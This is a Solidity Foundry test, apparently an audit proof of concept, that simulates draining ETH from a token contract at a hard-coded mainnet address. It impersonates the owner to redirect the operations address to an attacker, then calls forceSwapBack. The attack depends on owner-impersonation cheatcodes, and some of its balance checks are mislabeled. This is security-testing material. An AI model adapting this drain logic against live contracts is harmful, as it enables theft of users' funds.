// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function enableTrading() external;
    function forceSwapBack() external;
    function swapTokensAtAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    receive() external payable;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        FoundationToken_Comprehensive_Smart_Contract_Audit target = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);
        address owner = target.owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");
        vm.label(TARGET, "FoundationToken");

        // Start as the owner to perform privileged actions
        vm.startPrank(owner);

        // Set operations address to attacker's address
        target.setOperationsAddress(attacker);

        // Enable trading and swap if needed (though forceSwapBack should work regardless)
        target.enableTrading();

        // Stop prank
        vm.stopPrank();

        // Send some ETH to the contract to create a balance to steal
        // We'll send directly from the attacker
        (bool success, ) = TARGET.call{value: 10 ether}("");
        require(success, "Failed to send ETH to contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerBalance = address(this).balance;

        FoundationToken_Comprehensive_Smart_Contract_Audit target = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);

        // Impersonate owner again to call forceSwapBack
        vm.prank(target.owner());

        // Trigger the swap back to send ETH to operationsAddress (which is now attacker)
        // Note: forceSwapBack requires contract token balance >= swapTokensAtAmount
        // We need to ensure this condition is met

        // First, let's check if we need to transfer some tokens to the contract
        uint256 swapThreshold = target.swapTokensAtAmount();
        uint256 contractTokenBalance = target.balanceOf(TARGET);

        if (contractTokenBalance < swapThreshold) {
            // We need to get some tokens to the contract
            // The owner has all tokens initially, so we can transfer from owner to contract
            address owner = target.owner();

            // Impersonate owner to transfer tokens
            vm.startPrank(owner);

            // Calculate amount needed
            uint256 amountNeeded = swapThreshold - contractTokenBalance + 1;

            // Check owner balance
            uint256 ownerBalance = target.balanceOf(owner);
            require(ownerBalance >= amountNeeded, "Owner doesn't have enough tokens");

            // Transfer tokens to contract
            target.transfer(TARGET, amountNeeded);

            vm.stopPrank();
        }

        // Now call forceSwapBack as owner
        vm.prank(target.owner());
        target.forceSwapBack();

        // Check final balance
        uint256 finalAttackerBalance = address(this).balance;

        // Verify the attacker's balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased");
        uint256 finalContractBalance = address(this).balance;
        assertGt(finalContractBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

